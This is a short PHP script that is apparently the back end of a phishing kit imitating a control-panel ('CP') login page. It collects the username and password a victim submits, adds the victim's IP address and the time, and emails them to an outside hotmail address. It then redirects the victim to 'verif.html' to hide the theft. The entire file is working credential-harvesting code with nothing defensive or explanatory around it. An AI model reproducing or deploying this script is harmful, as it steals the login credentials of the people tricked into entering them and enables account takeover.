<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");

/**
 * @author avatar
 * @copyright 2011
 */
 	function redirect_to($url){
		echo '<script type="text/javascript">
		window.location = "'.$url.'"
		</script>';
		}
function send_email($from,$to,$subj,$msg){
				$header = "From: ".$from." \r\n";
				$header .= "Content-Type: text/html; charset=utf-8  \r\n";
				$retval = mail ($to,$subj,$msg,$header);
				   if( $retval == true ){
					 return true;
				   }else{
					 return false;
				   }
		}

 $body ="Hello,
This is sign details from CP

login       : $_POST[user]
password       : $_POST[pass]

====================
IP : $ip 
DATE : $datamasii
";
$subj 		= 'CP Sign Details';
			$from		= 'info@result.com';
			$to="federalgovtx2@hotmail.com";
send_email($from,$to,$subj,nl2br($body));
redirect_to('verif.html');
/**
 * 	$error=$body;
 *  $handle=fopen('error.txt','w');
 *   fwrite($handle,$error .'\n');	
 */
 
?>